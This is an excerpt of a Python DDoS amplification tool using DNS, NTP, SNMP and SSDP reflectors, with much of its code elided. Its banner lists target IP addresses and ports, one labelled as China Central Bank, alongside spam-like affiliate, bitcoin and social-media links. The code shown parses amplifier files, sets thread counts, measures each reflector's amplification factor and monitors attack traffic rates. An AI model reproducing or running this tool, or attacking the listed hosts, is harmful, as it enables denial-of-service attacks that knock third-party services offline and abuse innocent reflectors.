...
LOGO = r'''
Remote IT Support - http://remoteitsupport.unaux.com
VPS Hosting - http://fastserversnow.duoservers.com
* Twitter - https://twitter.com/OrlandoPCRepair
* Facebook - https://facebook.com/OrlandoPCRepair
* Youtube - https://youtube.com/user/OrlandoPCRepair

USA Cyber Army - http://www.Facebook.com/USACyberArmy1ST
* FREE Bitcoin - https://get.cryptobrowser.site/8130455
* Work at Home - https://picoworkers.com/?a=0c3aa3ac
* Get Paid to share links - https://join-adf.ly/22815313

!!Targets!!
China Central Bank -> 210.82.119.72 port 8443
164.51.167.157 port 22
164.51.167.158 port 22
8.26.112.197 port 53
8.26.112.200 port 53
'''

HELP = (
    'DNS Amplification File and Domains to Resolve (e.g: dns.txt:[evildomain.com|domains_file.txt]',
    'NTP Amplification file', 'SNMP Amplification file',
    'SSDP Amplification file', 'Number of threads (default=1)')

OPTIONS = ((('-d', '--dns'),
            dict(dest='dns', metavar='FILE:FILE|DOMAIN',
                 help=HELP[0])), (('-n', '--ntp'),
                                  dict(dest='ntp',
                                       metavar='FILE',
                                       help=HELP[1])), (('-s', '--snmp'),
                                                        dict(dest='snmp',
                                                             metavar='FILE',
                                                             help=HELP[2])),
           (('-p', '--ssdp'), dict(dest='ssdp', metavar='FILE',
                                   help=HELP[3])), (('-t', '--threads'),
                                                    dict(dest='threads',
                                                         type=int,
                                                         default=1,
                                                         metavar='N',
...
PORT = {'dns': 53, 'ntp': 123, 'snmp': 161, 'ssdp': 1900}
...
def Monitor():
    ...
    while True:
        try:
            ...
            out = FMT.format(Calc(npackets, 1000), Calc(nbytes, 1024, 'B'),
                             Calc(pps, 1000, 'pps'), Calc(bps, 1000, 'bps'))
        ...
        while True:
            ...
            if soldier:
                if proto == 'dns':
                    ...
                    print '{:^8}|{:^15}|{:^23}|{}'.format(
                        proto, soldier, AmpFactor(recvd, sent), 'N/A')
                    i += 1
            else:
                break
...
class DDoS(object):
    ...
    def __GetQName(self, domain):
        '''QNAME A domain name represented as a sequence of labels where each label consists of a lengthoctet followed by that number of octets'''
        labels = domain.split('.')
        QName = ''
        for label in labels:
            if len(label):
    ...
    def __attack(self):
        ...
        for proto in _files:  # Open Amplification files
            ...
            _files[proto].append(
                f)  # _files = {'proto':['file_name', file_handle]}
                ...
                if soldier:
                    if proto == 'dns':
                        ...
                        for domain in self.domains:
                            if not amplification[proto][soldier].has_key(
                                    domain):
                                size, _ = self.GetAmpSize(
                                    proto, soldier, domain)
                                if size == 0:
                                    break
